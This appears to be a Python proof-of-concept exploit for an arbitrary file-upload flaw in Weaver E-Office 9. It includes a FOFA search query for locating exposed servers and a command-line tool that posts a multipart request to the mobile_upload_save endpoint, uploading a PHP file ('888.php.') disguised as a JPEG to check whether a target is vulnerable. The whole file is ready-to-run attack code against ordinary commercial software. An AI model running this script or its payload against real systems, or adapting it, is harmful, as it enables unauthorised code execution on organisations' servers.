#FOFA：app="泛微-EOffice"
#导包
import requests,re,json,argparse,sys
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """
 _    _                            ___                 __ _ _                    _                 _               _                      _     _ _ _ _         
| |  | |                          / _ \               / _(_) |                  | |               | |             | |                    | |   (_) (_) |        
| |  | | ___  __ ___   _____ _ __/ /_\ \_ __  _   _  | |_ _| | ___   _   _ _ __ | | ___   __ _  __| | __   ___   _| |_ __   ___ _ __ __ _| |__  _| |_| |_ _   _ 
| |/\| |/ _ \/ _` \ \ / / _ \ '__|  _  | '_ \| | | | |  _| | |/ _ \ | | | | '_ \| |/ _ \ / _` |/ _` | \ \ / / | | | | '_ \ / _ \ '__/ _` | '_ \| | | | __| | | |
\  /\  /  __/ (_| |\ V /  __/ |  | | | | | | | |_| | | | | | |  __/ | |_| | |_) | | (_) | (_| | (_| |  \ V /| |_| | | | | |  __/ | | (_| | |_) | | | | |_| |_| |
 \/  \/ \___|\__,_| \_/ \___|_|  \_| |_/_| |_|\__, | |_| |_|_|\___|  \__,_| .__/|_|\___/ \__,_|\__,_|   \_/  \__,_|_|_| |_|\___|_|  \__,_|_.__/|_|_|_|\__|\__, |
                                               __/ |                      | |                                                                              __/ |
                                              |___/                       |_|                                                                             |___/ 


"""
    print(test)
#主函数
def main():
    banner()
    parse = argparse.ArgumentParser(description="泛微E-Office9文件上传漏洞")
    #添加参数
    parse.add_argument('-u','--url',dest='url',type=str,help="please input url")
    args = parse.parse_args()
    if args.url:
        poc(args.url)
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

#poc函数
def poc(target):
    payload = '/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save'
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36',
                'Content-Length': '338',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Connection': 'close',
                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data = '------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\nContent-Disposition: form-data; name="upload_quwan"; filename="888.php."\nContent-Type: image/jpeg\n\n<?php phpinfo();?>\n\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\nContent-Disposition: form-data; name="file"; filename=""\nContent-Type: application/octet-stream\n\n------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--'
    res = requests.post(url=target + payload,headers=headers,data=data,verify=False)
    #print(res.status_code)
    if res.status_code == 200 and 'php' in res.text:
        print(f'[+]{target}存在漏洞')
    else:
        print(f'[-]{target}不存在漏洞')
        
    
#函数入口
if __name__ =="__main__":
    main()
    
